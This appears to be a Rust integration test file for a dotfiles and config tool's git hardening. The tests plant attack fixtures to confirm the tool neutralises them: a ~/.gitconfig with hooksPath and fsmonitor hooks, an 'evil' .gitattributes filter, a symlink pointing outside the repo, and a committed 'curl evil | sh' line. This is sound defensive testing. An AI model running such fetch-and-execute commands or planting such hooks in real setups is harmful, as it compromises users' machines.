//! The hardening against the real `git`, in temporary folders. A fake can only show which flags are
//! passed, and these show what they do. `HOME` is a temp folder, every command's environment is
//! complete, and the only "server" is a local repo reached by rewriting the URL in the test's
//! runner, so nothing here touches this Mac's real settings or GitHub.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use soulcaster_core::approval::{ApprovalStore, Approvals, CommitSha, DotfilesApproval};
use soulcaster_core::catalog::Catalog;
use soulcaster_core::command::{Command, CommandOutput, CommandRunner, OutputStream, SpawnError};
use soulcaster_core::config::Config;
use soulcaster_core::lint::DEFAULT_CLONE_LOCATION;
use soulcaster_core::plan::DotfilesPlan;
use soulcaster_repo::dotfiles::{DotfilesError, DotfilesStep, LinkOutcome, UserStage};
use soulcaster_repo::fake::{FakeGitHub, FileApprovals, RepoShape};
use soulcaster_repo::process::runner;
use soulcaster_repo::save::{CONFIG_REPO_NAME, SaveOutcome, SaveRequest, save};
use soulcaster_repo::tools::Tools;

const GIT: &str = "/usr/bin/git";

/// Plain commands for building the test's own repos.
fn sh(cwd: &Path, args: &[&str]) -> String {
    let out = runner()
        .run(
            &Command::new(GIT)
                .args(args.iter().copied())
                .cwd(cwd)
                .env("HOME", cwd.to_string_lossy())
                .env("PATH", "/usr/bin:/bin")
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_AUTHOR_NAME", "Test")
                .env("GIT_AUTHOR_EMAIL", "test@example.invalid")
                .env("GIT_COMMITTER_NAME", "Test")
                .env("GIT_COMMITTER_EMAIL", "test@example.invalid"),
            &mut |_, _| {},
        )
        .unwrap();
    assert!(
        out.is_success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    out.stdout_text().trim().to_string()
}

/// `gh` and `curl` go to the fake, and git runs for real with one change: the URL it was given
/// points at a local repo, so the local protocol has to be allowed for this test only.
struct LocalServer {
    fake: FakeGitHub,
    from: String,
    to: PathBuf,
}

impl CommandRunner for LocalServer {
    fn run(
        &self,
        command: &Command,
        on_line: &mut dyn FnMut(OutputStream, &str),
    ) -> Result<CommandOutput, SpawnError> {
        if command.program != Path::new(GIT) {
            return self.fake.run(command, on_line);
        }
        let mut real = command.clone();
        for arg in &mut real.args {
            if *arg == self.from {
                *arg = self.to.to_string_lossy().into_owned();
            }
            if arg == "protocol.allow=never" {
                *arg = "protocol.allow=always".to_string();
            }
        }
        for (key, value) in &mut real.env {
            if key == "GIT_ALLOW_PROTOCOL" {
                *value = "file".to_string();
            }
        }
        let mut output = runner().run(&real, on_line)?;
        // The repo on disk names the local path, and the code under test asks which repo it is.
        if command.args.iter().any(|a| a == "--get") {
            output.stdout = format!("{}\n", self.from).into_bytes();
        }
        Ok(output)
    }
}

struct World {
    _dir: tempfile::TempDir,
    home: PathBuf,
    server: PathBuf,
    tools: Tools,
    store: FileApprovals,
}

fn world() -> World {
    let dir = tempfile::tempdir().unwrap();
    let base = fs::canonicalize(dir.path()).unwrap();
    let home = base.join("home");
    fs::create_dir_all(&home).unwrap();
    let server = base.join("server");
    fs::create_dir_all(&server).unwrap();
    sh(&server, &["init", "--quiet", "--initial-branch=main"]);
    sh(
        &server,
        &["config", "uploadpack.allowAnySHA1InWant", "true"],
    );
    let mut tools = Tools::fixed(home.clone());
    tools.git = Some(PathBuf::from(GIT));
    let store = FileApprovals::new(base.join("approvals.json"));
    World {
        _dir: dir,
        home,
        server,
        tools,
        store,
    }
}

fn commit_file(server: &Path, path: &str, text: &str) -> CommitSha {
    let at = server.join(path);
    fs::create_dir_all(at.parent().unwrap()).unwrap();
    fs::write(at, text).unwrap();
    sh(server, &["add", "--all"]);
    sh(server, &["commit", "--quiet", "-m", "change"]);
    CommitSha::parse(&sh(server, &["rev-parse", "HEAD"])).unwrap()
}

const URL: &str = "https://github.com/example-you/dotfiles.git";

fn runner(world: &World) -> LocalServer {
    LocalServer {
        fake: FakeGitHub::new(),
        from: URL.to_string(),
        to: world.server.clone(),
    }
}

fn plan() -> DotfilesPlan {
    DotfilesPlan {
        repo: "example-you/dotfiles".to_string(),
        links: [("~/.zshrc".to_string(), "zsh/zshrc".to_string())].into(),
        refused_links: vec![],
        install_script: None,
    }
}

fn approve(world: &World, plan: &DotfilesPlan, commit: &CommitSha) {
    world
        .store
        .write(&Approvals {
            dotfiles: Some(DotfilesApproval {
                repo: "github.com/example-you/dotfiles".to_string(),
                commit: commit.clone(),
                links: plan.links.clone(),
            }),
            ..Approvals::default()
        })
        .unwrap();
}

fn step<'a>(world: &'a World, runner: &'a LocalServer) -> DotfilesStep<'a> {
    DotfilesStep {
        runner,
        tools: &world.tools,
        store: &world.store,
        clone_location: DEFAULT_CLONE_LOCATION,
        stamp: "run-1",
    }
}

#[test]
fn the_clone_lands_on_the_approved_commit_even_when_the_branch_has_moved_on() {
    let world = world();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let newer = commit_file(&world.server, "zsh/zshrc", "someone pushed this later\n");
    assert_ne!(approved, newer);
    let runner = runner(&world);
    let plan = plan();
    approve(&world, &plan, &approved);

    let report = step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    assert_eq!(report.commit, approved);
    assert!(matches!(report.rows[0].outcome, LinkOutcome::Linked { .. }));
    let linked = world.home.join(".zshrc");
    assert_eq!(fs::read_to_string(linked).unwrap(), "approved\n");
    let clone = world.home.join("Developer/dotfiles");
    assert_eq!(sh(&clone, &["rev-parse", "HEAD"]), approved.as_str());
}

#[test]
fn a_config_on_this_mac_cannot_run_a_hook_during_the_clone() {
    let world = world();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let marker = world.home.join("hook-ran");

    // The attack from the design: a linked ~/.gitconfig with a hook and an fsmonitor.
    let hooks = world.home.join("evil-hooks");
    fs::create_dir_all(&hooks).unwrap();
    for name in [
        "post-checkout",
        "post-merge",
        "pre-commit",
        "reference-transaction",
    ] {
        let hook = hooks.join(name);
        fs::write(&hook, format!("#!/bin/sh\ntouch '{}'\n", marker.display())).unwrap();
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
    }
    fs::write(
        world.home.join(".gitconfig"),
        format!(
            "[core]\n\thooksPath = {}\n\tfsmonitor = {}/post-checkout\n",
            hooks.display(),
            hooks.display()
        ),
    )
    .unwrap();
    let runner = runner(&world);
    let plan = plan();
    approve(&world, &plan, &approved);
    step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    assert!(!marker.exists(), "a hook ran");
    assert!(
        fs::read_dir(world.home.join("Developer/dotfiles/.git/hooks"))
            .map_or(true, |mut entries| entries.next().is_none()),
        "no template hooks were copied in"
    );
}

#[test]
fn a_filter_or_a_hook_shipped_inside_the_repo_does_nothing() {
    let world = world();
    let marker = world.home.join("filter-ran");
    fs::write(world.server.join(".gitattributes"), "* filter=evil\n").unwrap();
    // A file named like a hook, in a folder named like one. It can't be `.git/hooks`.
    fs::create_dir_all(world.server.join("hooks")).unwrap();
    fs::write(
        world.server.join("hooks/post-checkout"),
        format!("#!/bin/sh\ntouch '{}'\n", marker.display()),
    )
    .unwrap();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let runner = runner(&world);
    let plan = plan();
    approve(&world, &plan, &approved);
    step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    assert!(!marker.exists());
    assert_eq!(
        fs::read_to_string(world.home.join(".zshrc")).unwrap(),
        "approved\n"
    );
}

#[test]
fn a_repo_symlink_pointing_outside_is_checked_out_and_then_refused() {
    let world = world();
    let secret = world.home.join("secret.txt");
    fs::write(&secret, "secret").unwrap();
    std::os::unix::fs::symlink(&secret, world.server.join("outward")).unwrap();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let runner = runner(&world);
    let mut plan = plan();
    plan.links
        .insert("~/.outward".to_string(), "outward".to_string());
    approve(&world, &plan, &approved);
    let report = step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    let row = report
        .rows
        .iter()
        .find(|r| r.target == "~/.outward")
        .unwrap();
    assert!(matches!(row.outcome, LinkOutcome::Refused(_)), "{row:?}");
    assert!(fs::symlink_metadata(world.home.join(".outward")).is_err());
}

#[test]
fn a_commit_the_server_does_not_have_leaves_nothing_behind() {
    let world = world();
    commit_file(&world.server, "zsh/zshrc", "approved\n");
    let runner = runner(&world);
    let plan = plan();
    let gone = CommitSha::parse("0123456789abcdef0123456789abcdef01234567").unwrap();
    approve(&world, &plan, &gone);
    let error = step(&world, &runner)
        .ensure_clone(&plan, UserStage::password_is_gone())
        .unwrap_err();
    assert!(
        matches!(error, DotfilesError::CommitGone | DotfilesError::Offline),
        "{error:?}"
    );
    assert!(!world.home.join("Developer/dotfiles").exists());
}

#[test]
fn a_preview_fetches_the_newer_commit_and_moves_nothing_until_approved() {
    let world = world();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let runner = runner(&world);
    let plan = plan();
    approve(&world, &plan, &approved);
    step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    let newer = commit_file(&world.server, "zsh/zshrc", "curl evil | sh\n");

    let preview = step(&world, &runner).preview_move(&plan, &newer).unwrap();
    assert!(
        preview.text().contains("+curl evil | sh"),
        "{}",
        preview.text()
    );
    assert_eq!(
        fs::read_to_string(world.home.join(".zshrc")).unwrap(),
        "approved\n",
        "a preview moved nothing"
    );
    let clone = world.home.join("Developer/dotfiles");
    assert_eq!(sh(&clone, &["rev-parse", "HEAD"]), approved.as_str());

    step(&world, &runner)
        .move_after_review(&plan, &preview)
        .unwrap();
    assert_eq!(sh(&clone, &["rev-parse", "HEAD"]), newer.as_str());
    assert_eq!(world.store.read().unwrap().dotfiles.unwrap().commit, newer);
    assert_eq!(
        fs::read_to_string(world.home.join(".zshrc")).unwrap(),
        "curl evil | sh\n"
    );
}

#[test]
fn own_changes_in_the_clone_stop_a_move() {
    let world = world();
    let approved = commit_file(&world.server, "zsh/zshrc", "approved\n");
    let runner = runner(&world);
    let plan = plan();
    approve(&world, &plan, &approved);
    step(&world, &runner)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap();
    let newer = commit_file(&world.server, "zsh/zshrc", "newer\n");
    let preview = step(&world, &runner).preview_move(&plan, &newer).unwrap();
    fs::write(world.home.join("Developer/dotfiles/zsh/zshrc"), "my edit\n").unwrap();
    assert_eq!(
        step(&world, &runner)
            .move_after_review(&plan, &preview)
            .unwrap_err(),
        DotfilesError::ChangesOnThisMac
    );
    assert_eq!(
        fs::read_to_string(world.home.join("Developer/dotfiles/zsh/zshrc")).unwrap(),
        "my edit\n"
    );
}

/// A bare repo that accepts pushes, standing in for the person's Config Repo.
fn bare_config_repo(world: &World) -> PathBuf {
    let bare = world.server.parent().unwrap().join("config-repo.git");
    fs::create_dir_all(&bare).unwrap();
    sh(
        &bare,
        &["init", "--quiet", "--bare", "--initial-branch=main"],
    );
    sh(&bare, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    bare
}

fn saved_config() -> Config {
    Config::parse(br#"{"schemaVersion":1,"name":"My Mac","items":["ghostty"]}"#).unwrap()
}

#[test]
fn a_save_is_the_canonical_file_authored_by_the_noreply_address_and_nothing_else() {
    let world = world();
    let bare = bare_config_repo(&world);
    let fake = FakeGitHub::new();
    fake.sign_in("example-you", 42);
    let server = LocalServer {
        fake,
        from: format!("https://github.com/example-you/{CONFIG_REPO_NAME}.git"),
        to: bare.clone(),
    };
    let config = saved_config();
    let outcome = save(
        &server,
        &world.tools,
        Catalog::shipped(),
        &SaveRequest {
            config: &config,
            repo_name: CONFIG_REPO_NAME,
            base: None,
        },
    )
    .unwrap();
    let SaveOutcome::Sent {
        commit,
        created_repo,
        ..
    } = outcome
    else {
        panic!("{outcome:?}");
    };
    assert!(created_repo);
    assert_eq!(
        sh(&bare, &["rev-parse", "refs/heads/main"]),
        commit.as_str()
    );
    assert_eq!(
        sh(&bare, &["show", "main:configs/my-mac.json"]).trim_end(),
        config.to_canonical_json().trim_end()
    );
    let who = sh(&bare, &["log", "-1", "--format=%an|%ae|%cn|%ce|%s", "main"]);
    assert_eq!(
        who,
        "example-you|42+example-you@users.noreply.github.com|example-you|42+example-you@users.noreply.github.com|Save configs/my-mac.json"
    );
}

#[test]
fn a_save_on_top_of_a_moved_repo_keeps_what_else_is_there() {
    let world = world();
    let bare = bare_config_repo(&world);
    // Someone already saved another file.
    let other = commit_file(&world.server, "configs/other.json", "{}\n");
    sh(
        &world.server,
        &[
            "push",
            "--quiet",
            bare.to_str().unwrap(),
            "HEAD:refs/heads/main",
        ],
    );
    let fake = FakeGitHub::new();
    fake.sign_in("example-you", 42);
    fake.add_repo(
        "example-you",
        CONFIG_REPO_NAME,
        RepoShape::private("main", other.as_str()),
    );
    let server = LocalServer {
        fake,
        from: format!("https://github.com/example-you/{CONFIG_REPO_NAME}.git"),
        to: bare.clone(),
    };
    let config = saved_config();
    let request = SaveRequest {
        config: &config,
        repo_name: CONFIG_REPO_NAME,
        base: None,
    };
    let outcome = save(&server, &world.tools, Catalog::shipped(), &request).unwrap();
    assert!(matches!(outcome, SaveOutcome::Sent { .. }), "{outcome:?}");
    assert_eq!(sh(&bare, &["show", "main:configs/other.json"]), "{}");
    assert!(sh(&bare, &["show", "main:configs/my-mac.json"]).contains("My Mac"));
    assert_eq!(sh(&bare, &["rev-parse", "main~1"]), other.as_str());
}
